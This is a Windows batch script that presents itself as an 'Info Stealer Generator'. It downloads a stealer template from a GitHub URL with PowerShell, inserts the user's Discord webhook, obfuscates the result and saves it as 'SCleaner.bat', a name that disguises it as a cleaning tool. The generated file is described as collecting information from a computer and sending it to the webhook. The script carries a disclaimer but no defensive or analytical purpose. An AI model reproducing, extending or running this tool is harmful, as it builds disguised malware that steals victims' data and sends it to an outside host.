@echo off
color 0f
cd /d "%~dp0"
if not "%1"=="" set webhook=%1
goto is

:IS 
cls
if exist logo.bat call logo.bat & echo.
echo Info Stealer Generator
echo =======================
echo I AM NOT RESPONSIBLE FOR ANYTHING CAUSED BY THIS SCRIPT.
echo This will generate a batch script that will collect info from a computer and send it to a discord webhook.
echo.
if not exist isgen.txt echo Downloading isgen.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/smt/refs/heads/main/Files/isgen.txt -OutFile isgen.txt"
if "%webhook%"=="" set /p webhook=Please enter a webhook URL: 
if exist "%TEMP%\SCleaner.bat" del "%TEMP%\SCleaner.bat"
type isgen.txt>>"%TEMP%\SCleaner.bat"
powershell -Command "(Get-Content '%TEMP%\SCleaner.bat') -replace 'your_webhook_url_here1', '%webhook%' | Set-Content '%TEMP%\SCleaner.bat'"
call bfo "%TEMP%\SCleaner.bat" >nul
del "%TEMP%\SCleaner.bat"
ren SCleaner___.bat SCleaner.bat >nul
move SCleaner.bat "%USERPROFILE%\Downloads\" >nul
echo.
echo Info Stealer generated and obfuscated (%USERPROFILE%\Downloads\SCleaner.bat)
if "%1"=="" pause >nul
if "%1"=="" exit
if NOT "%1"=="" goto :EOF